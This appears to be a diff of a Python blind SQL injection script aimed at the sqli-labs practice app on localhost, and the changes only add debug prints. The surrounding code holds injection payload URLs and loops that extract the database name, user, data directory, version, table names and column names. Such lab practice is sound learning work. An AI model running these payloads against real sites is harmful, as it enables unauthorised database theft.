@@ -23,6 +23,7 @@ def database_name_length_finder(payload, validator):
         list_payload[87] = str(i)
         payload_1 = "".join(list_payload)
 
+        print(payload_1)
         response_text = get_requester(payload_1)
         response_formatted_text = text_formatter(response_text)
 
@@ -45,6 +46,7 @@ def database_name_finder(payload, validator):
     payload_database_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (select length(database())) = 1 --+"
 
     database_name_length = database_name_length_finder(payload_database_length, validator)
+    print(database_name_length)
 
     while (i < database_name_length):
         i = i + 1
@@ -56,9 +58,11 @@ def database_name_finder(payload, validator):
                 list_payload_2[100] = str(a)
                 payload_1 = "".join(list_payload_2)
 
+                print(payload_1)
                 response_text_1 = get_requester(payload_1)
                 response_formatted_text_1 = text_formatter(response_text_1)
             else:
+                print(payload_1)
                 response_text_1 = get_requester(payload_1)
                 response_formatted_text_1 = text_formatter(response_text_1)
 
@@ -85,6 +89,7 @@ def username_length_finder(payload, validator):
         list_payload[83] = str(i)
         payload_1 = "".join(list_payload)
 
+        print(payload_1)
         response_text = get_requester(payload_1)
         response_formatted_text = text_formatter(response_text)
 
@@ -108,6 +113,7 @@ def username_finder(payload, validator):
     payload_username_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (select length(user())) = 0 --+"
 
     username_length = username_length_finder(payload_username_length, validator)
+    print(username_length)
 
     while (i < username_length):
         i = i + 1
@@ -119,9 +125,11 @@ def username_finder(payload, validator):
                 list_payload_2[96] = str(a)
                 payload_1 = "".join(list_payload_2)
 
+                print(payload_1)
                 response_text_1 = get_requester(payload_1)
                 response_formatted_text_1 = text_formatter(response_text_1)
             else:
+                print(payload_1)
                 response_text_1 = get_requester(payload_1)
                 response_formatted_text_1 = text_formatter(response_text_1)
 
@@ -148,6 +156,7 @@ def datadir_length_finder(payload, validator):
         list_payload[86] = str(i)
         payload_1 = "".join(list_payload)
 
+        print(payload_1)
         response_text = get_requester(payload_1)
         response_formatted_text = text_formatter(response_text)
 
@@ -171,6 +180,7 @@ def datadir_finder(payload, validator):
     payload_datadir_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (select length(@@datadir)) = 0 --+"
 
     datadir_length = datadir_length_finder(payload_datadir_length, validator)
+    print(datadir_length)
 
     while (i < datadir_length):
         i = i + 1
@@ -182,9 +192,11 @@ def datadir_finder(payload, validator):
                 list_payload_2[99] = str(a)
                 payload_1 = "".join(list_payload_2)
 
+                print(payload_1)
                 response_text_1 = get_requester(payload_1)
                 response_formatted_text_1 = text_formatter(response_text_1)
             else:
+                print(payload_1)
                 response_text_1 = get_requester(payload_1)
                 response_formatted_text_1 = text_formatter(response_text_1)
 
@@ -211,6 +223,7 @@ def version_length_finder(payload, validator):
         list_payload[86] = str(i)
         payload_1 = "".join(list_payload)
 
+        print(payload_1)
         response_text = get_requester(payload_1)
         response_formatted_text = text_formatter(response_text)
 
@@ -234,6 +247,7 @@ def version_finder(payload, validator):
     payload_version_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (select length(version())) = 1 --+"
 
     version_length = version_length_finder(payload_version_length, validator)
+    print(version_length)
 
     while (i < version_length):
         i = i + 1
@@ -245,9 +259,11 @@ def version_finder(payload, validator):
                 list_payload_2[99] = str(a)
                 payload_1 = "".join(list_payload_2)
 
+                print(payload_1)
                 response_text_1 = get_requester(payload_1)
                 response_formatted_text_1 = text_formatter(response_text_1)
             else:
+                print(payload_1)
                 response_text_1 = get_requester(payload_1)
                 response_formatted_text_1 = text_formatter(response_text_1)
 
@@ -274,6 +290,7 @@ def tablename_length_finder(payload, validator):
         list_payload[162] = str(i)
         payload_1 = "".join(list_payload)
 
+        print(payload_1)
         response_text = get_requester(payload_1)
         response_formatted_text = text_formatter(response_text)
 
@@ -297,6 +314,7 @@ def tablename_finder(payload, validator):
     payload_tablename_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (select length(group_concat(table_name)) from information_schema.tables where table_schema=database()) = 0 --+"
 
     tablename_length = tablename_length_finder(payload_tablename_length, validator)
+    print(tablename_length)
 
     while (i < tablename_length):
         i = i + 1
@@ -308,9 +326,11 @@ def tablename_finder(payload, validator):
                 list_payload_2[175] = str(a)
                 payload_1 = "".join(list_payload_2)
 
+                print(payload_1)
                 response_text_1 = get_requester(payload_1)
                 response_formatted_text_1 = text_formatter(response_text_1)
             else:
+                print(payload_1)
                 response_text_1 = get_requester(payload_1)
                 response_formatted_text_1 = text_formatter(response_text_1)
 
@@ -337,6 +357,7 @@ def columnname_length_finder(payload, validator):
         list_payload[159] = str(i)
         payload_1 = "".join(list_payload)
 
+        print(payload_1)
         response_text = get_requester(payload_1)
         response_formatted_text = text_formatter(response_text)
 
@@ -360,6 +381,7 @@ def columnname_finder(payload, validator):
     payload_columnname_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (select length(group_concat(column_name)) from information_schema.columns where table_name='users') = 0 --+"
 
     columnname_length = columnname_length_finder(payload_columnname_length, validator)
+    print(columnname_length)
 
     while (i < columnname_length):
         i = i + 1
@@ -371,9 +393,11 @@ def columnname_finder(payload, validator):
                 list_payload_2[172] = str(a)
                 payload_1 = "".join(list_payload_2)
 
+                print(payload_1)
                 response_text_1 = get_requester(payload_1)
                 response_formatted_text_1 = text_formatter(response_text_1)
             else:
+                print(payload_1)
                 response_text_1 = get_requester(payload_1)
                 response_formatted_text_1 = text_formatter(response_text_1)
 
@@ -408,6 +432,7 @@ def sql_injector():
     table_name = tablename_finder(payload_tablename, validator)
     column_name = columnname_finder(payload_columnname, validator)
 
+    print("\n")
     print("Version: " + version_name)
     print("\n")
     print("Database_Name: " + database_name)
